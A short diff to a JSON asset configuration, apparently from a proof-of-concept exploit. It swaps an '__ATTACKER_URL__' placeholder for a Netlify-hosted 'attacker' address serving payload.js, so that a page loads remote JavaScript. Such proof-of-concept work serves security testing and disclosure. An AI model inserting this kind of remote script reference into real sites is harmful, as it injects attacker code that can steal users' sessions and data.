@@ -1,6 +1,6 @@
 [
   {
     "assetType": "js",
-    "path": "__ATTACKER_URL__/payload.js"
+    "path": "https://agoda-poc-attacker.netlify.app/payload.js"
   }
 ]
